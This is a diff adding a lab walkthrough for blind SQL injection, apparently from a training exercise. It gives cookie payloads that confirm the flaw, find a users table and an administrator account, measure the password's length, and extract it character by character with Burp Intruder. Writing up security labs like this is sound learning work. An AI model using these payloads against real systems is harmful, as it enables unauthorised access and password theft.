@@ -41,7 +41,41 @@ xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator')
 ```
 "Welcome back" message appeared and it is confirm first character of password is `s`
 
+# Lab
+1) Modify the `TrackingId` cookie, changing it to:
+```bash
+TrackingId=xyz' AND '1'='1
+```
+Verify that the "Welcome back" message appears in the response. Now change it to `'1'='2` verify message is not appeared
+that is confirmed vulnerability
 
+2) Payload:
+```bash
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+```
+Verify that the condition is true, confirming that there is a table called `users`.
+
+3) Payload:
+```bash
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+```
+Condition true which means there is user called `administrator`
+
+4) Payload to check password length:
+```bash
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
+```
+When "Welcome back" message disappered that is number of password, now it is 20 character long
+
+5) Next payload for burp intruder:
+```bash
+xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
+```
+Then will find password one by one by changing `(password,2,1)` and so on.
+
+
+## Perfect explanation on you tube
+https://youtu.be/LBG_n9fr8sM
 
 
 
